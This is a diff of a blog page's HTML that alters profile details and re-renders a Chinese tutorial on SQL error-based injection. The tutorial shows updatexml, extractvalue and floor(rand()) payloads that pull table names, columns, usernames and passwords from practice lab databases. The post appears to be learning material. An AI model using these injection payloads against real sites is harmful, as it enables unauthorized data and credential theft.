@@ -237,10 +237,10 @@
     <div class="main-left--info">
       <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
       <div class="main-left--intro">
-        <p class="main-left--name">Cola.</p>
+        <p class="main-left--name">freelander</p>
         <div class="main-left--tags">
-          <span class="main-left--tag">中二</span>
-          <span class="main-left--tag">宅</span>
+          <span class="main-left--tag">旅游</span>
+          <span class="main-left--tag">音乐</span>
         </div>
       </div>
     </div>
@@ -335,7 +335,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>551天</span>
+        <span>5天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -367,6 +367,11 @@ pre::-webkit-scrollbar-thumb {
 pre:active {
   background-color: rgb(81, 95, 116);
 }
+
+  .catelogue {
+    max-height: 300px; /* 设置目录容器的最大高度 */
+    overflow-y: auto; /* 添加垂直滚动条 */
+  }
 </style>
 
 <div class="article-container">
@@ -394,11 +399,22 @@ pre:active {
     </div>
     <article class="article-content">
       <h1 id="sql注入报错函数"><a href="#sql注入报错函数" class="headerlink" title="sql注入报错函数"></a>sql注入报错函数</h1><h2 id="updataexml报错函数"><a href="#updataexml报错函数" class="headerlink" title="updataexml报错函数"></a>updataexml报错函数</h2><p>updatexml（）有三个参数<br>以 ~ 开头的内容不是 xml 格式的语法，concat() 函数为字符串连接函数显然不符合规则，<br>但是会将括号内的执行结果以错误的形式报出，这样就可以实现报错注入了<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串）<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>分析完三个参数能明白为什么会有报错信息了<br>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lili’+and+updatexml(1,concat(0x7e,(user()，0x7e),1)   </span><br><span class="line"></span><br><span class="line">lili&#x27;+and+updatexml(1,concat(0x7e,(select+group_concat(username)+from+users),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">lili’+and+updatexml(1,concat(0x7e,(user()，0x7e),1)   
+
+lili&#39;+and+updatexml(1,concat(0x7e,(select+group_concat(username)+from+users),0x7e),1)--+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528232858852.png"></p>
 <h2 id="extractvalue报错函数"><a href="#extractvalue报错函数" class="headerlink" title="extractvalue报错函数"></a>extractvalue报错函数</h2><p>函数extractValue()包含俩个参数<br>第一参数 XML文档对象名称，第二参数路径</p>
-<p>lili’ and extractvalue(1,concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’))) –+</p>
+<pre class="line-numbers language-none"><code class="language-none">lili&#39; and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) 
+from information_schema.tables where table_schema&#x3D;&#39;security&#39;))) --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+
+
+
+
+
 <h2 id="floor报错函数"><a href="#floor报错函数" class="headerlink" title="floor报错函数"></a>floor报错函数</h2><p>rand()函数：随机返回0~1间的小数</p>
 <p>floor()函数：小数向下取整数。向上取整数ceiling()</p>
 <p>concat_ws()函数：将括号内数据用第一个字段连接起来（和concat差不多）</p>
@@ -406,16 +422,25 @@ pre:active {
 <p>as：别名</p>
 <p>count函数：汇总统计数量</p>
 <p>limit：这里用于显示指定行数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select count(*),concat_ws(&#x27;~&#x27;,(select table_name),floor(rand(0)*2)) as a from information_schema.tables where table_schema=&quot;pikachu&quot; group by a;  //读取当前数据库的表名</span><br><span class="line"></span><br><span class="line">//把concat_ws部分代码取一个别名 a ，在使用group by 对a进行分组</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">
+select count(*),concat_ws(&#39;~&#39;,(select table_name),floor(rand(0)*2)) 
+as a from information_schema.tables where table_schema&#x3D;&quot;pikachu&quot; group by a;  &#x2F;&#x2F;读取当前数据库的表名
+
+&#x2F;&#x2F;把concat_ws部分代码取一个别名 a ，在使用group by 对a进行分组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192251286-1692439261286.png"> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;~&#x27;,(select column_name),floor(rand(0)*2)) as a from information_schema.columns where table_name=&quot;users&quot; group by a;  //读取当前数据库的users表中的字段</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">select count(*),concat_ws(&#39;~&#39;,(select column_name),floor(rand(0)*2)) as a 
+from information_schema.columns where table_name&#x3D;&quot;users&quot; group by a;  &#x2F;&#x2F;读取当前数据库的users表中的字段<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192203109.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select count(*),concat_ws(&#x27;~&#x27;,(select username),floor(rand(0)*2)) as a from users group by a;</span><br><span class="line">//读取当前数据库的账号</span><br><span class="line"></span><br><span class="line">select count(*),concat_ws(&#x27;~&#x27;,(select password),floor(rand(0)*2)) as a from users group by a;</span><br><span class="line">//读取当前数据的密码</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">select count(*),concat_ws(&#39;~&#39;,(select username),floor(rand(0)*2)) as a from users group by a;
+&#x2F;&#x2F;读取当前数据库的账号
+
+select count(*),concat_ws(&#39;~&#39;,(select password),floor(rand(0)*2)) as a from users group by a;
+&#x2F;&#x2F;读取当前数据的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230528192541662.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,count(*),concat_ws(&#x27;~&#x27;,((select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;)),floor(rand(0)*2)) as a from information_schema.columns group by a --+</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;-1&#39; union select 1,count(*),concat_ws(&#39;~&#39;,((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot;)),floor(rand(0)*2)) as a from information_schema.columns group by a --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2023/08/19/sql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0/image-20230529125332673.png"></p>
 
